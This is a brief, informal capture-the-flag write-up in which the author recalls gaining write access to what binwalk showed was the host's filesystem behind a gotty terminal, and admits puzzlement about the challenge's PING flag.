We are badass, but we do (try to) playfair.

This is your first hint:

; Searching for the flag..

I also had write access to the device and binwalk showed that this is actually the host device's FS (https://github.com/yudai/gotty) :)

which I guess was the purpose of the challenge but I didnt use the PING flag so much.. stil dont know what it ment..

I guess having write access to the FS of the host also ment being able to destroy the challenge for everybody else which was kind of tempting because of the prize...

** this challenge's author is a mistery to me...
